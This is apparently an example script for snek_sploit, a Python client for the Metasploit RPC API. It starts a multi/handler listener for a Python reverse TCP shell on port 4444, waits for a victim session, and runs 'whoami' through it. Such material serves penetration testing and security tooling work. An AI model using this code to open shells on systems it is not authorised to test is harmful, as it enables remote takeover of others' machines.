import time

from snek_sploit import Client, ModuleType


if __name__ == '__main__':
    client = Client("msf", "root", disable_https_warnings=True)

    execution = client.module.rpc.execute(
        ModuleType.exploit,
        "multi/handler",
        {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444}
    )
    print("Listener started!")
    print("Once you connect to it, the script will continue... ")
    # Code used to create the connection can be either generated using the msfvenom
    # or taking a look into tests/e2e/test.py (`create_connection("localhost")`)

    while client.session.rpc.list_sessions() == {}:
        time.sleep(1)

    session_id = list(client.session.rpc.list_sessions().keys())[-1]
    print(f"Session {session_id} created!")
    client.session.rpc.shell_write(session_id, 'whoami')
    print("Executed `whoami` command in the opened session... ")
    time.sleep(3)
    result = client.session.rpc.shell_read(session_id)
    print(f"Result: {result}")
